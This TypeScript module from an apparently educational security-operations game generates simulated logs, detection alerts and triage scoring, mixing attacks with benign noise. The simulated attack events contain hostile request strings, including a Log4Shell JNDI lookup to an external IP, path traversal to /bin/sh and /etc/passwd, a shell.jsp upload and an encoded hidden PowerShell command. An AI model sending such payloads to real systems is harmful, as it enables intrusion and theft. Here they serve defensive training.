/**
 * Phase 13 security operations: logs → detection rules → an alert queue the player triages.
 *
 * Everyday activity produces log events too (typos, scanners, backups, IT admins), so the queue
 * mixes real attacks with false alarms; filters in the rules hide the known-good ones. Escalating a
 * real alert detects its incident at once; escalating a false alarm costs analyst time; real alerts
 * left too long expire as missed. Security controls change what is visible: EDR adds endpoint
 * telemetry, a SIEM adds network flows and merges repeats, an email gateway quarantines some
 * phishing, immutable backups speed up restores. Pure and seeded: same seed, same alerts.
 */
import type { NetNode, NodeKind, Topology } from "../model";
import { MINUTES_PER_TICK, minuteOfTick, timeOfDay } from "../sim/clock";
import { deriveSeed, noise } from "../sim/rng";
import { externalIp, type LogEvent, type LogSource } from "./logs";
import { RULES, ruleMatches } from "./rules";

const TICKS_PER_HOUR = 60 / MINUTES_PER_TICK;
/** New alerts nobody looked at for this long expire (counted as missed when they were real). */
export const ALERT_EXPIRY_TICKS = 4 * TICKS_PER_HOUR;
const MAX_EVENTS = 400;
const MAX_ALERTS = 200;
/** A SIEM merges repeats of the same rule on the same host within this window. */
const CORRELATION_TICKS = Math.round(30 / MINUTES_PER_TICK);
/** Analyst time spent chasing an escalated false alarm. */
export const FALSE_ALARM_COST = 150;

// ── Controls ─────────────────────────────────────────────────────────────────

export const CONTROL_IDS = ["edr", "siem", "email-gateway", "immutable-backups"] as const;
export type ControlId = (typeof CONTROL_IDS)[number];

export interface Control {
  name: string;
  blurb: string;
  effect: string;
  /** Cost for one game, given the headcount. */
  price(employees: number): number;
}

export const CONTROLS: Record<ControlId, Control> = {
  edr: {
    name: "Endpoint detection & response (EDR)",
    blurb: "A sensor on every computer that records what programs do.",
    effect: "Adds endpoint alerts: malicious documents, remote service installs, vendor agents calling home.",
    price: (n) => 20 * n,
  },
  siem: {
    name: "Central logging (SIEM)",
    blurb: "Collects network flows and correlates logs in one place.",
    effect: "Adds network-flow alerts (large transfers out) and merges repeat alerts into one.",
    price: () => 5000,
  },
  "email-gateway": {
    name: "Email security gateway",
    blurb: "Scans links and attachments and checks sender authenticity.",
    effect: "Quarantines about half of phishing and fake-invoice emails before anyone sees them.",
    price: (n) => 8 * n,
  },
  "immutable-backups": {
    name: "Immutable backups",
    blurb: "Backup copies that can't be changed or deleted, even by an administrator.",
    effect: "Restores after ransomware take half the time.",
    price: () => 3000,
  },
};

/** Log sources that need a control before anything is collected from them. */
export const SOURCE_NEEDS: Partial<Record<LogSource, ControlId>> = { edr: "edr", netflow: "siem" };

// ── State ────────────────────────────────────────────────────────────────────

export interface Alert {
  id: string;
  tick: number;
  ruleId: string;
  event: LogEvent;
  status: "new" | "escalated" | "dismissed" | "expired";
}

export interface SocStats {
  /** Real alerts escalated. */
  caught: number;
  /** False alarms escalated. */
  falseAlarms: number;
  /** Real alerts dismissed or left to expire. */
  missed: number;
  /** False alarms correctly dismissed. */
  cleared: number;
}

export interface SocState {
  seq: number;
  events: LogEvent[];
  alerts: Alert[];
  /** Rule ids turned off by the player. */
  disabled: string[];
  controls: ControlId[];
  stats: SocStats;
}

const emptyStats = (): SocStats => ({ caught: 0, falseAlarms: 0, missed: 0, cleared: 0 });
export const emptySoc = (): SocState => ({ seq: 0, events: [], alerts: [], disabled: [], controls: [], stats: emptyStats() });
/** True when there is nothing worth saving (keeps older saves byte-identical). */
export const isEmptySoc = (s: SocState) =>
  s.seq === 0 && !s.events.length && !s.alerts.length && !s.disabled.length && !s.controls.length;

/** Something an attacker did that leaves a trace in the logs. */
export type AttackStep =
  | { step: "macro"; host: string }
  | { step: "exploit"; host: string; cve?: string }
  | { step: "lateral"; host: string; from: string }
  | { step: "lateral-fail"; host: string; from: string }
  | { step: "vpn-storm"; host: string }
  | { step: "bank-change"; host: string; internal: boolean }
  | { step: "beacon"; host: string }
  | { step: "exfil"; host: string; mb: number }
  | { step: "mass-read"; host: string };

const PERSON = new Set<NodeKind>(["desktop", "laptop"]);

export class Soc {
  state: SocState = emptySoc();
  private readonly people: NetNode[];
  private readonly publicSite?: NetNode;
  private readonly vpn?: NetNode;
  private readonly fileServer?: NetNode;
  private readonly backupNas?: NetNode;

  constructor(private readonly seed: number, private readonly topology: Topology) {
    this.people = topology.nodes.filter((n) => PERSON.has(n.kind) && !n.tags.includes("guest"));
    this.publicSite = topology.nodes.find((n) => n.services.includes("https") && n.kind !== "cloud");
    this.vpn = topology.nodes.find((n) => n.kind === "vpn");
    this.fileServer = topology.nodes.find((n) => n.kind === "server" && n.services.includes("files")) ?? topology.nodes.find((n) => n.kind === "nas");
    this.backupNas = topology.nodes.find((n) => n.kind === "nas" && n.services.includes("backup"));
  }

  has(c: ControlId): boolean {
    return this.state.controls.includes(c);
  }

  collects(source: LogSource): boolean {
    const need = SOURCE_NEEDS[source];
    return !need || this.has(need);
  }

  private rnd(tick: number, k: number): number {
    return noise(deriveSeed(this.seed, "soc"), tick * 97 + k);
  }

  private account(node: NetNode | undefined, r: number): string {
    const dept = (node?.label ?? "staff").toLowerCase().split(/\s+/)[0]!.replace(/[^a-z]/g, "") || "staff";
    return `${dept}.user${1 + Math.floor(r * Math.max(1, node?.count ?? 1))}`;
  }

  /** Records an event if its source is collected and raises an alert for every enabled rule it matches. */
  log(e: LogEvent): void {
    if (!this.collects(e.source)) return;
    const s = this.state;
    s.events.push(e);
    if (s.events.length > MAX_EVENTS) s.events.splice(0, s.events.length - MAX_EVENTS);
    for (const rule of RULES) {
      if (s.disabled.includes(rule.id) || !ruleMatches(rule, e)) continue;
      const repeat =
        this.has("siem") &&
        s.alerts.some((a) => a.ruleId === rule.id && a.event.host === e.host && a.status === "new" && e.tick - a.tick <= CORRELATION_TICKS);
      if (repeat) continue;
      s.alerts.push({ id: `al-${++s.seq}`, tick: e.tick, ruleId: rule.id, event: e, status: "new" });
    }
    if (s.alerts.length > MAX_ALERTS) s.alerts.splice(0, s.alerts.length - MAX_ALERTS);
  }

  /** Log events caused by an attack (`incidentId` is the hidden truth used to score triage). */
  attack(a: AttackStep, incidentId: string, tick: number): void {
    const r = (k: number) => this.rnd(tick, 500 + k + this.state.seq);
    const node = (id: string) => this.topology.nodes.find((n) => n.id === id);
    const ev = (source: LogSource, host: string, fields: LogEvent["fields"]) => this.log({ tick, source, host, fields, incidentId });
    switch (a.step) {
      case "macro":
        ev("edr", a.host, { ParentImage: "WINWORD.EXE", Image: "powershell.exe", CommandLine: "powershell -nop -w hidden -enc SQBFAFgA...", User: this.account(node(a.host), r(1)) });
        break;
      case "exploit": {
        const pattern = a.cve === "CVE-2021-44228" ? "GET /?q=${jndi:ldap://" + externalIp(r(2)) + "/a}" : r(3) < 0.5 ? "GET /cgi-bin/../../../../bin/sh" : "POST /api/upload?f=../../shell.jsp";
        ev("firewall", a.host, { Action: "allow", Src: externalIp(r(4)), Dst: a.host, DstPort: 443, Request: pattern, ...(a.cve ? { Signature: a.cve } : {}) });
        break;
      }
      case "lateral":
        // Not every hop is logged: a reused session or a local account leaves no 4624 on the target.
        if (r(5) < 0.7) ev("windows", a.host, { EventID: 4624, LogonType: 3, Account: this.account(node(a.from), r(6)), SourceHost: a.from, Baseline: "unseen" });
        ev("edr", a.host, { Action: "remote-service-create", ParentImage: "services.exe", Image: "psexesvc.exe", SourceHost: a.from });
        break;
      case "lateral-fail":
        ev("windows", a.host, { EventID: 4625, LogonType: 3, Account: this.account(node(a.from), r(7)), SourceHost: a.from, Count: 6 + Math.floor(r(8) * 6), Status: "0xC000006A" });
        break;
      case "vpn-storm":
        ev("vpn", a.host, { Result: "failure", Attempts: 400 + Math.floor(r(9) * 2000), DistinctSources: 20 + Math.floor(r(10) * 80), Src: externalIp(r(11)) });
        break;
      case "bank-change":
        ev("email", a.host, {
          Verdict: "delivered",
          From: a.internal ? "finance@internal" : "accounts@supp1ier-payments.example",
          SenderDomain: a.internal ? "internal" : "lookalike",
          Subject: "Urgent: updated bank details for invoice 4471",
          SPF: a.internal ? "pass" : "fail",
        });
        break;
      case "beacon":
        ev("edr", a.host, { Action: "network-connect", Image: "vendor-agent.exe", Signed: "true", Destination: externalIp(r(12)), DstPort: 443, Baseline: "unseen-destination" });
        break;
      case "exfil":
        ev("netflow", a.host, { Direction: "outbound", Src: a.host, Dst: externalIp(r(13)), DstPort: 443, BytesOut: Math.round(a.mb * 1e6), DestinationTag: "unknown" });
        break;
      case "mass-read":
        ev("windows", this.fileServer?.id ?? a.host, { EventID: 4663, Account: this.account(node(a.host), r(14)), ObjectType: "File", Count: 400 + Math.floor(r(15) * 800), SourceHost: a.host });
        break;
    }
  }

  /** Everyday activity for one tick: mostly harmless, some of it noisy enough to trip a rule. */
  noise(tick: number): void {
    const hour = timeOfDay(minuteOfTick(tick)) / 60;
    const working = hour >= 7 && hour < 19 ? 1 : 0.2;
    const staff = this.topology.meta.employees;
    let k = 0;
    const chance = (perHour: number) => this.rnd(tick, ++k) < (perHour * working) / TICKS_PER_HOUR;
    const pickPerson = () => this.people[Math.floor(this.rnd(tick, ++k) * this.people.length)];

    if (this.people.length && chance(staff / 60)) {
      // Someone mistypes a new password several times (trips the failed-logon rule).
      const p = pickPerson()!;
      this.log({ tick, source: "windows", host: p.id, fields: { EventID: 4625, LogonType: 2, Account: this.account(p, this.rnd(tick, ++k)), Count: 5 + Math.floor(this.rnd(tick, ++k) * 4), Status: "0xC000006A" } });
    }
    if (this.people.length && chance(0.4)) {
      // IT admin remote support: filtered out by the rule's exception.
      const p = pickPerson()!;
      this.log({ tick, source: "windows", host: p.id, fields: { EventID: 4624, LogonType: 3, Account: "it-admin", SourceHost: "it-laptop", Baseline: "unseen" } });
    }
    if (this.people.length > 1 && chance(0.15)) {
      // Two colleagues sharing files for the first time: a false alarm.
      const p = pickPerson()!;
      const q = pickPerson()!;
      if (p.id !== q.id) this.log({ tick, source: "windows", host: p.id, fields: { EventID: 4624, LogonType: 3, Account: this.account(q, this.rnd(tick, ++k)), SourceHost: q.id, Baseline: "unseen" } });
    }
    if (this.vpn && chance(0.05)) {
      // A laptop with a stale saved password hammering the VPN.
      this.log({ tick, source: "vpn", host: this.vpn.id, fields: { Result: "failure", Attempts: 100 + Math.floor(this.rnd(tick, ++k) * 60), DistinctSources: 1, Src: externalIp(this.rnd(tick, ++k)) } });
    }
    if (this.publicSite && chance(0.25)) {
      // Internet scanners: blocked most of the time, occasionally let through to a patched app.
      const allowed = this.rnd(tick, ++k) < 0.3;
      this.log({ tick, source: "firewall", host: this.publicSite.id, fields: { Action: allowed ? "allow" : "deny", Src: externalIp(this.rnd(tick, ++k)), Dst: this.publicSite.id, DstPort: 443, Request: "GET /cgi-bin/status?x=../../etc/passwd", Scanner: "internet-research" } });
    }
    if (this.people.length && chance(0.12)) {
      // Supplier emails: a known supplier (filtered) or a genuine new one (false alarm).
      const known = this.rnd(tick, ++k) < 0.6;
      this.log({ tick, source: "email", host: pickPerson()!.id, fields: { Verdict: "delivered", From: known ? "ar@known-supplier.example" : "billing@new-vendor.example", SenderDomain: known ? "known-supplier" : "new-vendor", Subject: "Remittance advice: new account details", SPF: "pass" } });
    }
    if (this.people.length && chance(0.06)) {
      const p = pickPerson()!;
      this.log({ tick, source: "edr", host: p.id, fields: { ParentImage: "EXCEL.EXE", Image: "powershell.exe", CommandLine: "powershell -File \\\\fileserver\\finance\\month-end-report.ps1", User: this.account(p, this.rnd(tick, ++k)) } });
    }
    if (this.backupNas && hour >= 1 && hour < 4 && chance(2)) {
      // Nightly offsite backup: large, but to the known backup provider (filtered).
      this.log({ tick, source: "netflow", host: this.backupNas.id, fields: { Direction: "outbound", Src: this.backupNas.id, Dst: externalIp(this.rnd(tick, ++k)), DstPort: 443, BytesOut: 900_000_000, DestinationTag: "backup-provider" } });
    }
    if (this.people.length && chance(0.08)) {
      const p = pickPerson()!;
      this.log({ tick, source: "netflow", host: p.id, fields: { Direction: "outbound", Src: p.id, Dst: externalIp(this.rnd(tick, ++k)), DstPort: 443, BytesOut: 60_000_000 + Math.floor(this.rnd(tick, ++k) * 200_000_000), DestinationTag: "file-sharing" } });
    }
    if (this.fileServer && this.people.length && chance(0.05)) {
      const p = pickPerson()!;
      this.log({ tick, source: "windows", host: this.fileServer.id, fields: { EventID: 4663, Account: this.account(p, this.rnd(tick, ++k)), ObjectType: "File", Count: 300 + Math.floor(this.rnd(tick, ++k) * 200), SourceHost: p.id } });
    }
  }

  /** New alerts nobody reviewed in time expire; real ones count as missed. */
  expire(tick: number): void {
    for (const a of this.state.alerts) {
      if (a.status !== "new" || tick - a.tick < ALERT_EXPIRY_TICKS) continue;
      a.status = "expired";
      if (a.event.incidentId) this.state.stats.missed++;
    }
  }

  /** Applies a verdict. Returns the alert, or an error message. */
  triage(id: string, verdict: "escalate" | "dismiss"): Alert | string {
    const a = this.state.alerts.find((x) => x.id === id);
    if (!a) return "That alert is no longer in the queue";
    if (a.status !== "new") return "That alert has already been handled";
    const real = a.event.incidentId !== undefined;
    a.status = verdict === "escalate" ? "escalated" : "dismissed";
    const st = this.state.stats;
    if (verdict === "escalate") {
      if (real) st.caught++;
      else st.falseAlarms++;
    } else if (real) st.missed++;
    else st.cleared++;
    return a;
  }

  /** A new game: fresh logs, queue and stats; controls and rule choices carry over. */
  reset(): void {
    this.state = { ...emptySoc(), disabled: this.state.disabled, controls: this.state.controls };
  }

  exportState(): SocState {
    return JSON.parse(JSON.stringify(this.state)) as SocState;
  }

  importState(s: SocState | undefined): void {
    const base = emptySoc();
    if (!s) {
      this.state = base;
      return;
    }
    const c = JSON.parse(JSON.stringify(s)) as Partial<SocState>;
    this.state = {
      seq: c.seq ?? 0,
      events: c.events ?? [],
      alerts: c.alerts ?? [],
      disabled: (c.disabled ?? []).filter((id) => RULES.some((r) => r.id === id)),
      controls: (c.controls ?? []).filter((x): x is ControlId => (CONTROL_IDS as readonly string[]).includes(x)),
      stats: { ...base.stats, ...c.stats },
    };
  }
}
